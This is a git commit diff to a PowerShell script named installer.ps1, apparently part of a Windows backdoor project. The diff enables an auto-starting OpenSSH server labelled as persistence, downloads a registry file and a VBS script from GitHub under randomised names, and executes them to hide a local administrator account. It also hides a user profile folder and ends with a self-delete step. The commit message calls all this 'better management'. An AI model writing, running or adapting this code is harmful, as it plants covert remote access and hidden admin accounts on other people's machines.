0f597fb1007bc4c49e88e3c6d9802f92a891f0fd
gozen-foto <gofoto.zen@proton.me>
2026-04-20 16:05:01 +0530

    Update installer.ps1
    Updated registry and script file handling for better management.

--- installer.ps1
+++ installer.ps1
@@ -55,23 +55,25 @@ Remove-Item -Path eword.txt
 mkdir $path
 cd $path
 
-# registry to hide local admin
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/Registry.reg -OutFile "Registry.reg"
-
-# visual basic script to register the registry
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/confirm.vbs -OutFile "confirm.vbs"
-
 #enabling persistence ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 
+# registry to hide local admin
+$reg_file = random_text
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/Registry.reg -OutFile "$reg_file.reg"
+
+# visual basic script to register the registry
+$con_file = random_text
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/confirm.vbs -OutFile "$con_file.vbs"
+
 # install the registry
-./"Registry.reg"; ./"confirm.vbs"
+Invoke-Expression "./$reg_file.reg"; Invoke-Expression "./$con_file.vbs"
 
 # hide WindowsGuest user
 cd C:\Users
-attrib +h +s +r rootuser
+attrib +h +s +r winlocal
 
 # self delete
 cd $initial_dir
